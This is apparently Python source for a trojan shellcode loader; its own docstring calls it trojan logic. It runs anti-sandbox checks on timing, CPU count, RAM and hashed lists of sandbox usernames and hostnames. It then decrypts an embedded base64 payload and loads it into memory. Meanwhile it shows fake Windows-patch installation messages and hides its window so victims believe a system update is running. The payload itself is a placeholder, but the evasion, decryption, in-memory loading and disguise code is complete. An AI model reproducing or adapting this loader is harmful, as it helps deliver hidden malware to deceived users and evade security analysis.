import base64
import threading
import time
from hashlib import sha256

import psutil
from multiprocessing import cpu_count
from socket import gethostname

from common.crypto_utils import crypto_utils
from common.LoadMemory import LoadMemory
import time
from loguru import logger
from getpass import getuser

"""
  木马程序逻辑
"""

def get_sanbox_users():
    users = ["3e93bb7b2887e4881fa7da105c8d95b1893a8373e2e24bee8460dcb69bd3cf04","2cd7b171d2155f0878a5b89ac6fea662241d05e7ef1555452a92006d2a7021f9","7707505e68f824301174b8824a9b9df32605193986fbcb61d0a18d0d28cf9e56","414efb531d1cb23f5778650492d0c7cae356a9633479ef59b1e2169ff9823265","8af67b85a6d66d4c84eb00dc9b4a662a88be1f6339c343f0f27403745ca5fec5","97c27f98cb4a1af26817b4137ef1baab09d6407e423cf1b99997289cc9786c38","14a3ca62b588cf9aa4e9164a4882d66fff67d0a09ba29aeca41b780583901370","cd5f0ac52ead5ad93bb7f732aabf554bf61f8a3070f50b02a91a7b3db99c3205","880473c8b0932cd60b918c0476ad84430739d77f4a01898bb214c842b7d25bd2","01568c005922d1a75fc61738c75c4546870ecc5a5571c83934ccab5ab4156ea8","d06b048d8ab08ee0778dd18bea5fe42b78dcb3bec7b6c57a3f029168e10edcd3","6cf318048779a91ef96bd2cd1ead164c12d1c57e0b2ffc27f4fa184242a960dd","b6ca2c4d97e775b984312c0c383097dd9b8beadbbb5d1f516441a0372b443d38","7f4d76ebe8a027c4d0f198f14971bf09400c9452efca9d458fef22be1b73118d","dcac8e623396c5f9459460209c55435ef52bb16424edf6da136ba84cd2b35982","e831df0ae56afd1a0a086d723e7876a7096428284c2efd40a611c4dece5d226c","9c4c99c53a93995dc9630b1c0b384955a71904c360e8596cef5811a9e45f2b8b","67f6331ef1bd6d094ce49dfdf2e9cd86e636c8aa88a6c9b86c86e9beb4d7f7b","709175a4a328264d72a2e92e16ffa4a6e6eadf72da354e3673f5e27cac92bf63","a0a3531a232f67d10627647ad48d0eb032d4b5dde05bf229cdbd5be6798747b5","613d614c562a5a59f53223b56e13687d0715f830804eb115d2c40d7e0b43e1b8","6d376cff5c619aa02f76b8742c4b4eedd54ffa2582afedee465d150ba2b0b438","34ac133f0eac7f69b29f86eff4954c739203eaf4855b6c82a201f039268c937e","d3d3e02d666cabb5e26b33de344b5bb08095a1bd73be8201800b56f26ee29d38","1f3dfcc66198c87416e8004e33c932b94cfecac38732dd895e4324add7ab4c91","8a08da7c7ac2a709e019a97699d1a3f920680ad712207d23134426a53f0c95e4","3be0c9573bc4b1e81c26bbb77e00c4d585868fe44dcfce48c5924dea9f2b49ca","5a6e0bd92925b9f91ffec26805eb653f8d5117e8b4813248a87b55765729c0a2","f0b35713f16c4d9cfdbe4dc9b7cc7c8f24676e81cffe1150c8529205a4426d71","19203833e3dc9e0871ee98daa166f8817c2deedc44fd8371a55dc0119003ba5c","71bc0e605d52850557bf58f35f60f4deee63ceb2b2613d36e1a87f1a63483c3e","2da5c4ea837e60abf644c217ed0f360a1221d033b3ef7486ab267dc5ffa31841","dfca1dca8404208458945cc023a905306dc15e4680c0803055210bc71858ecdd","a6687db04a62d5b549b1fb9dbc42af981949aa2349a47ac3cc1128d2839ffe2e"]
    return users

def get_sanbox_computers():
    computers = ["3e93bb7b2887e4881fa7da105c8d95b1893a8373e2e24bee8460dcb69bd3cf04","2cd7b171d2155f0878a5b89ac6fea662241d05e7ef1555452a92006d2a7021f9","7707505e68f824301174b8824a9b9df32605193986fbcb61d0a18d0d28cf9e56","414efb531d1cb23f5778650492d0c7cae356a9633479ef59b1e2169ff9823265","8af67b85a6d66d4c84eb00dc9b4a662a88be1f6339c343f0f27403745ca5fec5","97c27f98cb4a1af26817b4137ef1baab09d6407e423cf1b99997289cc9786c38","14a3ca62b588cf9aa4e9164a4882d66fff67d0a09ba29aeca41b780583901370","cd5f0ac52ead5ad93bb7f732aabf554bf61f8a3070f50b02a91a7b3db99c3205","880473c8b0932cd60b918c0476ad84430739d77f4a01898bb214c842b7d25bd2","01568c005922d1a75fc61738c75c4546870ecc5a5571c83934ccab5ab4156ea8","d06b048d8ab08ee0778dd18bea5fe42b78dcb3bec7b6c57a3f029168e10edcd3","6cf318048779a91ef96bd2cd1ead164c12d1c57e0b2ffc27f4fa184242a960dd","b6ca2c4d97e775b984312c0c383097dd9b8beadbbb5d1f516441a0372b443d38","7f4d76ebe8a027c4d0f198f14971bf09400c9452efca9d458fef22be1b73118d","dcac8e623396c5f9459460209c55435ef52bb16424edf6da136ba84cd2b35982","e831df0ae56afd1a0a086d723e7876a7096428284c2efd40a611c4dece5d226c","9c4c99c53a93995dc9630b1c0b384955a71904c360e8596cef5811a9e45f2b8b","67f6331ef1bd6d094ce49dfdf2e9cd86e636c8aa88a6c9b86c86e9beb4d7f7b9","709175a4a328264d72a2e92e16ffa4a6e6eadf72da354e3673f5e27cac92bf63","a0a3531a232f67d10627647ad48d0eb032d4b5dde05bf229cdbd5be6798747b5","613d614c562a5a59f53223b56e13687d0715f830804eb115d2c40d7e0b43e1b8","6d376cff5c619aa02f76b8742c4b4eedd54ffa2582afedee465d150ba2b0b438","34ac133f0eac7f69b29f86eff4954c739203eaf4855b6c82a201f039268c937e","d3d3e02d666cabb5e26b33de344b5bb08095a1bd73be8201800b56f26ee29d38","1f3dfcc66198c87416e8004e33c932b94cfecac38732dd895e4324add7ab4c91","8a08da7c7ac2a709e019a97699d1a3f920680ad712207d23134426a53f0c95e4","3be0c9573bc4b1e81c26bbb77e00c4d585868fe44dcfce48c5924dea9f2b49ca","5a6e0bd92925b9f91ffec26805eb653f8d5117e8b4813248a87b55765729c0a2","f0b35713f16c4d9cfdbe4dc9b7cc7c8f24676e81cffe1150c8529205a4426d71","19203833e3dc9e0871ee98daa166f8817c2deedc44fd8371a55dc0119003ba5c","71bc0e605d52850557bf58f35f60f4deee63ceb2b2613d36e1a87f1a63483c3e","2da5c4ea837e60abf644c217ed0f360a1221d033b3ef7486ab267dc5ffa31841","dfca1dca8404208458945cc023a905306dc15e4680c0803055210bc71858ecdd","a6687db04a62d5b549b1fb9dbc42af981949aa2349a47ac3cc1128d2839ffe2e"]
    return computers
def hash_name(i_str: str):
    i_str += "CanUGuessMe?"
    return sha256(i_str.encode()).hexdigest()

def check_vm():
    """
    反沙箱逻辑
    """
    logger.debug("开始执行沙箱检测逻辑")
    total = round(psutil.virtual_memory().total / (1024.0 * 1024.0 * 1024.0), 2)
    pre = int(time.time())
    user = getuser()
    compuer = gethostname()

    time.sleep(2)
    now = int(time.time())
    if now-pre < 2:
        logger.debug("检测到沙箱")
        exit(1)
    if cpu_count() < 3:
        logger.debug("检测到沙箱")
        exit(0)
    if total < 2:
        logger.debug("检测到沙箱")
        exit(0)
    if hash_name(user) in get_sanbox_users():
        logger.debug("沙箱用户")
        exit(0)
    if hash_name(compuer) in get_sanbox_computers():
        logger.debug("沙箱计算机")
        exit(0)


def pwn():
    check_vm()
    shellcode_raw = b"666666666666"  # 待替换的shllcode
    shellcode = base64.b64decode(shellcode_raw)
    # print(shellcode)
    key, cipher = shellcode.split(b"||split||")
    crypto_utils.key = key
    plain_text_raw = crypto_utils.decrypt(cipher)
    LoadMemory.load_memory(plain_text_raw)


def ui():
    time.sleep(1)
    print("系统补丁安装程序，此过程将持续3-5分钟左右，请耐心等候，不要关闭此窗口")
    time.sleep(1)
    print("[+] KB20220617 补丁安装中，请稍等。。。 ")


def run():
    t = threading.Thread(target=pwn)
    t.start()
    ui()
    t.join()

    # multiprocessing.set_start_method("spawn")
    # p = multiprocessing.Process(target=pwn)
    # p.start()

    # p.join()


def launch():
    check_vm()
    import tkinter
    top = tkinter.Tk()
    top.title("漏洞补丁安装程序")
    top.geometry('0x0')
    top.resizable(0, 0)
    top["background"] = "#666"
    # top['borderwidth'] = '0'
    top.attributes('-alpha', 1)
    top.withdraw()  # 隐藏窗口
    # top.iconbitmap("./resource/photo.ico")
    run()
    top.mainloop()

    # pwn()


if __name__ == '__main__':
   launch()
